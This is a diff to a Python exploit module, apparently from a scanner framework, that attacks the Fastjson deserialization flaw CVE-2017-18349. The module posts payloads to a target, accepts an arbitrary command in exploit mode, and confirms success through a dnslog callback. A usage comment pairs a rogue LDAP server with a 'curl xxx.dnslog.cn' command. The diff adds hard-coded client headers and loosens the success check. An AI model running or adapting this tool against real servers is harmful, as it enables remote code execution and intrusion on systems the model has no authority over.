@@ -14,6 +14,7 @@ import CodeTest
 # 用法：java -cp fastjson_tool.jar fastjson.HLDAPServer 106.12.132.186 10086 "curl xxx.dnslog.cn"
 # eg: 传入 IP+port 即可
 CodeTest.VULN = None
+CodeTest.DEBUG = True
 TIMEOUT = 10
 DL = Dnslog()
 class Fastjson():
@@ -23,14 +24,6 @@ class Fastjson():
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
-        if self.port == None and r"https://" in self.url:
-            self.port = 443
-        elif self.port == None and r"http://" in self.url:
-            self.port = 80
-        if r"https://" in self.url:
-            self.url = "https://"+self.hostname+":"+str(self.port)
-        if r"http://" in self.url:
-            self.url = "http://"+self.hostname+":"+str(self.port)
         self.host = self.hostname + ":" + str(self.port)
         self.headers = {
             'Host': ""+self.host,
@@ -38,7 +31,10 @@ class Fastjson():
             'Connection': 'close',
             'Accept-Language': 'en',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
+            'X-Client-TimeStamp': '1609093784',
+            'X-Client-Identity': 'f4ad8bc756bd2fd6ef5685b5fb780bce',
+            'X-Client-Sign': '27b838d3918aae04'
         }
         self.payload_cve_2017_18349_24 = {
             "b": {
@@ -70,7 +66,9 @@ class Fastjson():
         try:
             self.request = requests.post(self.url, data=self.payload_cve_2017_18349_24, headers=self.headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
-            if DL.result() and self.request.status_code==500:
+            time.sleep(2)
+            #if DL.result() or self.request.status_code==500:
+            if DL.result():
                 self.info = CodeTest.Colored_.derce() + ' [version: <1.2.24]'
                 self.r = 'VuLnEcHoPoCSuCCeSS'
                 CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
@@ -91,7 +89,9 @@ class Fastjson():
         try:
             self.request = requests.post(self.url, data=self.payload_cve_2017_18349_47, headers=self.headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
-            if DL.result() and self.request.status_code==400:
+            time.sleep(2)
+            #if DL.result() or self.request.status_code==400:
+            if DL.result():
                 self.info = CodeTest.Colored_.derce() + ' [version: <1.2.47]'
                 self.r = 'VuLnEcHoPoCSuCCeSS'
                 CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
@@ -111,9 +111,9 @@ print("""
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
     if CodeTest.VULN == None:
-        ExpFastjson = Fastjson(_urlparse(kwargs['url']),DL.dns_host())
+        ExpFastjson = Fastjson(kwargs['url'],DL.dns_host())
     else:
-        ExpFastjson = Fastjson(_urlparse(kwargs['url']),kwargs['cmd'])
+        ExpFastjson = Fastjson(kwargs['url'],kwargs['cmd'])
     if kwargs['pocname'] == "cve_2017_18349_24":
         ExpFastjson.cve_2017_18349_24()
     elif kwargs['pocname'] == "cve_2017_18349_47":
@@ -121,6 +121,8 @@ def check(**kwargs):
     else:
         ExpFastjson.cve_2017_18349_24()
         ExpFastjson.cve_2017_18349_47()
+
+
 
 
 
